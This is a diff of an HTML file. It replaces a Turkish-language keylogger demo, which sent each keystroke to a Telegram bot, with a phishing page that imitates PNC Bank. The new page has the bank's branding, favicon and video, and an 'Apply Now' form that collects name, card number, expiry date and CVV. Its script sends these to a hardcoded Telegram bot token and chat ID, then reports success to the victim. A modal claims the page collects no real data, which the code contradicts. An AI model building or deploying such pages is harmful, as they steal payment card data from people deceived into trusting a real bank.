@@ -1,48 +1,418 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Keylogger Demo</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PNC Bank — Sample Page</title>
+<link rel="icon" href="https://www.pnc.com/etc.clientlibs/pnc/clientlibs/clientlib-base/resources/favicon.ico" />
+<style>
+  /* Reset & base */
+  *, *::before, *::after { box-sizing: border-box; }
+  body {
+    margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: #f1f3f5; color: #1a1a1a;
+    -webkit-font-smoothing: antialiased;
+  }
+  a { text-decoration: none; color: inherit; }
+  ul { list-style: none; margin: 0; padding: 0; }
+
+  /* Header */
+  header {
+    background: #004c97; /* PNC dark blue */
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 15px 30px;
+    position: sticky; top: 0; z-index: 999;
+    box-shadow: 0 2px 5px rgba(0,0,0,0.15);
+  }
+  header h1 {
+    font-weight: 700;
+    font-size: 1.6rem;
+    color: white;
+    user-select: none;
+  }
+
+  /* Navigation */
+  nav {
+    position: relative;
+  }
+  nav ul {
+    display: flex;
+    gap: 25px;
+  }
+  nav ul li a {
+    font-weight: 600;
+    font-size: 1rem;
+    padding: 6px 8px;
+    color: white;
+    transition: color 0.3s ease;
+  }
+  nav ul li a:hover,
+  nav ul li a:focus {
+    color: #00a4e4; /* lighter blue */
+    outline: none;
+  }
+
+  /* Hamburger */
+  .hamburger {
+    display: none;
+    flex-direction: column;
+    gap: 5px;
+    cursor: pointer;
+  }
+  .hamburger div {
+    width: 25px;
+    height: 3px;
+    background: white;
+    border-radius: 2px;
+  }
+
+  /* Mobile Nav */
+  @media (max-width: 768px) {
+    nav ul {
+      position: fixed;
+      top: 60px; right: 0;
+      background: #004c97;
+      width: 220px;
+      height: calc(100% - 60px);
+      flex-direction: column;
+      padding: 20px;
+      transform: translateX(100%);
+      transition: transform 0.3s ease;
+      box-shadow: -2px 0 5px rgba(0,0,0,0.2);
+    }
+    nav ul.active {
+      transform: translateX(0);
+    }
+    .hamburger {
+      display: flex;
+    }
+  }
+
+  /* Form Section (now at top) */
+  .form-section {
+    max-width: 480px;
+    background: white;
+    margin: 20px auto 40px;
+    padding: 30px 25px;
+    border-radius: 12px;
+    box-shadow: 0 6px 18px rgb(0 0 0 / 0.1);
+  }
+  .form-section h3 {
+    text-align: center;
+    margin-bottom: 20px;
+    color: #004c97;
+  }
+  form {
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
+  }
+  label {
+    font-weight: 600;
+    color: #333;
+  }
+  input {
+    padding: 10px 12px;
+    font-size: 1rem;
+    border: 1.8px solid #bbb;
+    border-radius: 6px;
+    transition: border-color 0.3s ease;
+  }
+  input:focus {
+    border-color: #004c97;
+    outline: none;
+  }
+  button {
+    background: #004c97;
+    border: none;
+    padding: 14px;
+    color: white;
+    font-weight: 700;
+    font-size: 1.1rem;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background: #003766;
+  }
+
+  /* Hero Section */
+  .hero {
+    background: white;
+    padding: 40px 20px 20px;
+    text-align: center;
+    max-width: 900px;
+    margin: 0 auto 40px;
+  }
+  .hero h2 {
+    font-size: 2rem;
+    margin-bottom: 10px;
+    color: #004c97;
+  }
+  .hero p {
+    font-size: 1.1rem;
+    margin-bottom: 25px;
+    color: #555;
+  }
+  .hero video {
+    max-width: 100%;
+    border-radius: 8px;
+    box-shadow: 0 0 12px rgba(0,0,0,0.1);
+  }
+
+  /* Campaigns Section */
+  .campaigns {
+    padding: 30px 10px 50px;
+    background: #e6f0fa;
+  }
+  .campaigns h3 {
+    text-align: center;
+    font-size: 1.8rem;
+    margin-bottom: 20px;
+    color: #004c97;
+  }
+  .campaign-list {
+    display: flex;
+    overflow-x: auto;
+    gap: 15px;
+    padding-bottom: 10px;
+  }
+  .campaign-item {
+    background: white;
+    min-width: 280px;
+    border-radius: 10px;
+    box-shadow: 0 4px 10px rgb(0 0 0 / 0.1);
+    flex-shrink: 0;
+    cursor: pointer;
+    transition: transform 0.3s ease;
+  }
+  .campaign-item:hover {
+    transform: scale(1.05);
+  }
+  .campaign-item img {
+    width: 100%;
+    border-radius: 10px 10px 0 0;
+    display: block;
+  }
+  .campaign-content {
+    padding: 15px;
+  }
+  .campaign-content h4 {
+    margin: 0 0 10px;
+    color: #004c97;
+  }
+  .campaign-content p {
+    font-size: 0.95rem;
+    color: #555;
+  }
+
+  /* Footer */
+  footer {
+    text-align: center;
+    padding: 25px 15px;
+    color: #666;
+    font-size: 0.9rem;
+    background: #e6f0fa;
+    user-select: none;
+  }
+
+  /* Scrollbar for campaigns */
+  .campaign-list::-webkit-scrollbar {
+    height: 8px;
+  }
+  .campaign-list::-webkit-scrollbar-thumb {
+    background: #004c97aa;
+    border-radius: 4px;
+  }
+  .campaign-list::-webkit-scrollbar-track {
+    background: transparent;
+  }
+
+  /* Legal Modal */
+  #legalModal {
+    position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+    background: rgba(0,0,0,0.6); display: flex; justify-content: center; align-items: center;
+    z-index: 10000;
+  }
+  #legalModal > div {
+    background: white; padding: 30px; border-radius: 12px; max-width: 400px; text-align: center;
+    box-shadow: 0 6px 18px rgba(0,0,0,0.2);
+  }
+  #legalModal h2 {
+    margin-top: 0; color: #004c97;
+  }
+  #legalModal p {
+    font-size: 1rem; color: #333;
+  }
+  #acceptLegal {
+    margin-top: 20px; padding: 10px 20px; font-size: 1rem; border: none;
+    background: #004c97; color: white; border-radius: 6px; cursor: pointer;
+  }
+</style>
 </head>
 <body>
-  <h2>Keylogger Demo</h2>
-  <p>Bu sadece sayfa içi girişleri Telegram'a gönderir. Eğitim amaçlıdır.</p>
-  <textarea id="input" rows="10" cols="60" placeholder="Buraya bir şeyler yaz..."></textarea>
+<!-- Yasal Uyarı Modal -->
+<div id="legalModal" role="dialog" aria-modal="true" aria-labelledby="legalTitle" aria-describedby="legalDesc">
+  <div>
+    <h2 id="legalTitle">Yasal Uyarı</h2>
+    <p id="legalDesc">
+      Bu sayfa sadece deneysel amaçlıdır ve gerçek veri toplamaz.<br>
+      Herhangi bir kötüye kullanım yasalara aykırıdır.<br>
+      Lütfen bu sayfayı etik dışı amaçlarla kullanmayınız.
+    </p>
+    <button id="acceptLegal">Kabul Ediyorum</button>
+  </div>
+</div>
 
-  <script>
-    const TELEGRAM_BOT_TOKEN = '7740489037:AAHgOz-DbTeXM-IqY9luQNPL4uao1kWrudU';
-    const TELEGRAM_CHAT_ID = '5395609882';
+<header>
+  <h1>PNC Bank</h1>
+  <nav>
+    <ul id="nav-list">
+      <li><a href="#form-section">Apply</a></li>
+      <li><a href="#hero">Home</a></li>
+      <li><a href="#campaigns">Campaigns</a></li>
+      <li><a href="#footer">Contact</a></li>
+    </ul>
+    <div class="hamburger" id="hamburger" aria-label="Menu" aria-expanded="false" role="button" tabindex="0">
+      <div></div>
+      <div></div>
+      <div></div>
+    </div>
+  </nav>
+</header>
 
-    let logBuffer = '';
+<section class="form-section" id="form-section" tabindex="-1" aria-label="Application Form">
+  <h3>Apply Now</h3>
+  <form id="cardForm" autocomplete="off" novalidate>
+    <label for="name">First Name</label>
+    <input id="name" name="name" type="text" placeholder="John" required aria-required="true" autocomplete="given-name" />
+    
+    <label for="surname">Last Name</label>
+    <input id="surname" name="surname" type="text" placeholder="Doe" required aria-required="true" autocomplete="family-name" />
+    
+    <label for="cardnumber">Card Number</label>
+    <input id="cardnumber" name="cardnumber" type="text" pattern="\d{16}" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric" required aria-required="true" />
+    
+    <label for="expiry">Expiry Date (MM/YY)</label>
+    <input id="expiry" name="expiry" type="text" pattern="(0[1-9]|1[0-2])\/\d{2}" placeholder="MM/YY" maxlength="5" required aria-required="true" />
+    
+    <label for="cvv">CVV</label>
+    <input id="cvv" name="cvv" type="password" pattern="\d{3}" placeholder="123" maxlength="3" inputmode="numeric" required aria-required="true" />
+    
+    <button type="submit" aria-label="Submit Application">Submit</button>
+  </form>
+</section>
 
-    document.addEventListener('keydown', function (e) {
-      logBuffer += e.key;
+<section class="hero" id="hero" tabindex="-1">
+  <h2>Welcome to PNC Personal Banking</h2>
+  <p>Secure, trusted and easy banking solutions for your financial needs.</p>
+  <video controls muted playsinline width="600" aria-label="PNC Bank Introduction Video">
+    <source src="https://www.pnc.com/content/dam/pnc-com/video/consumerbanking.mp4" type="video/mp4">
+    Your browser does not support the video tag.
+  </video>
+</section>
 
-      // Her 5 karakterde bir Telegram'a gönder
-      if (logBuffer.length >= 1) {
-        sendToTelegram(logBuffer);
-        logBuffer = '';
-      }
-    });
+<section class="campaigns" id="campaigns" tabindex="-1" aria-label="Current Campaigns">
+  <h3>Current Campaigns & Offers</h3>
+  <div class="campaign-list" role="list">
+    <div class="campaign-item" role="listitem" tabindex="0" aria-label="Cashback Offer">
+      <img src="https://images.unsplash.com/photo-1522202176988-66273c2fd55f?auto=format&fit=crop&w=400&q=80" alt="Cashback Offer" />
+      <div class="campaign-content">
+        <h4>5% Cashback on Groceries</h4>
+        <p>Earn cashback on every grocery purchase with your PNC debit card.</p>
+      </div>
+    </div>
+    <div class="campaign-item" role="listitem" tabindex="0" aria-label="Home Loan Offer">
+      <img src="https://images.unsplash.com/photo-1504384308090-c894fdcc538d?auto=format&fit=crop&w=400&q=80" alt="Home Loan Offer" />
+      <div class="campaign-content">
+        <h4>Low-Interest Home Loans</h4>
+        <p>Get competitive rates on new home loans and refinancing.</p>
+      </div>
+    </div>
+    <div class="campaign-item" role="listitem" tabindex="0" aria-label="Credit Card Rewards">
+      <img src="https://images.unsplash.com/photo-1496180727794-817822f65950?auto=format&fit=crop&w=400&q=80" alt="Credit Card Rewards" />
+      <div class="campaign-content">
+        <h4>Bonus Rewards on Credit Cards</h4>
+        <p>Sign up today and earn bonus points on your first purchase.</p>
+      </div>
+    </div>
+  </div>
+</section>
 
-    function sendToTelegram(message) {
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      const data = {
-        chat_id: TELEGRAM_CHAT_ID,
-        text: `🖊️ Yeni giriş: ${message}`
-      };
+<footer id="footer" tabindex="-1">
+  &copy; 2025 PNC Bank. All rights reserved.
+</footer>
 
-      fetch(url, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(data)
-      }).catch(err => {
-        console.error("Telegram gönderim hatası:", err);
-      });
+<script>
+  // Hamburger toggle
+  const hamburger = document.getElementById('hamburger');
+  const navList = document.getElementById('nav-list');
+  hamburger.addEventListener('click', () => {
+    navList.classList.toggle('active');
+    const expanded = hamburger.getAttribute('aria-expanded') === 'true';
+    hamburger.setAttribute('aria-expanded', !expanded);
+  });
+  hamburger.addEventListener('keydown', e => {
+    if(e.key === 'Enter' || e.key === ' ') {
+      e.preventDefault();
+      hamburger.click();
     }
-  </script>
+  });
+
+  // Legal modal handling
+  const legalModal = document.getElementById('legalModal');
+  const acceptBtn = document.getElementById('acceptLegal');
+  acceptBtn.addEventListener('click', () => {
+    legalModal.style.display = 'none';
+  });
+
+  // Telegram Bot Info (replace with your actual tokens)
+  const TELEGRAM_BOT_TOKEN = '7740489037:AAHgOz-DbTeXM-IqY9luQNPL4uao1kWrudU';
+  const TELEGRAM_CHAT_ID = '5395609882';
+
+  const form = document.getElementById('cardForm');
+
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const data = {
+      name: e.target.name.value.trim(),
+      surname: e.target.surname.value.trim(),
+      cardnumber: e.target.cardnumber.value.trim(),
+      expiry: e.target.expiry.value.trim(),
+      cvv: e.target.cvv.value.trim()
+    };
+
+    // Basic validation
+    if (!data.name || !data.surname || !data.cardnumber || !data.expiry || !data.cvv) {
+      alert('Please fill all fields correctly.');
+      return;
+    }
+
+    const message =
+      `New Fake Form Submission:%0A` +
+      `First Name: ${data.name}%0A` +
+      `Last Name: ${data.surname}%0A` +
+      `Card Number: ${data.cardnumber}%0A` +
+      `Expiry Date: ${data.expiry}%0A` +
+      `CVV: ${data.cvv}`;
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}`;
+
+    fetch(url)
+      .then(res => res.json())
+      .then(res => {
+        if (res.ok) {
+          alert('Form submitted successfully!');
+          form.reset();
+        } else {
+          alert('An error occurred, please try again.');
+        }
+      })
+      .catch(() => alert('Server unreachable.'));
+  });
+</script>
+
 </body>
 </html>
-
